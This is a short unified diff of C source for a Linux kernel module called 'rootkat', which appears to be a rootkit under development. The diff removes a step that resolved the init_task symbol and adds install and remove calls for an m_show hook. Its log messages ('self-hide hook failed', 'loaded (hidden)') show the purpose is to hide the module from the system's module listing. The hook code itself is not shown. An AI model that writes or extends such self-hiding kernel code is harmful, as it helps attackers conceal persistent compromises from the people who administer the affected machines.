@@ -7,13 +7,11 @@
 
 #define ROOTKAT_TAG "rootkat: "
 
+extern int  rootkat_hook_m_show_install(void);
+extern void rootkat_hook_m_show_remove(void);
+
 static int __init rootkat_init(void)
 {
-	static const char * const init_task_candidates[] = {
-		"init_task", NULL,
-	};
-	const char *matched = NULL;
-	unsigned long addr;
 	int rc;
 
 	pr_info(ROOTKAT_TAG "loading\n");
@@ -24,19 +22,19 @@ static int __init rootkat_init(void)
 		return rc;
 	}
 
-	addr = rootkat_resolve(init_task_candidates, &matched);
-	if (!addr) {
-		pr_err(ROOTKAT_TAG "init_task resolution failed\n");
-		return -ENOENT;
+	rc = rootkat_hook_m_show_install();
+	if (rc) {
+		pr_err(ROOTKAT_TAG "self-hide hook failed: %d\n", rc);
+		return rc;
 	}
-	pr_info(ROOTKAT_TAG "init_task (%s) @ %lx\n", matched, addr);
 
-	pr_info(ROOTKAT_TAG "loaded\n");
+	pr_info(ROOTKAT_TAG "loaded (hidden)\n");
 	return 0;
 }
 
 static void __exit rootkat_exit(void)
 {
+	rootkat_hook_m_show_remove();
 	pr_info(ROOTKAT_TAG "unloaded\n");
 }
 
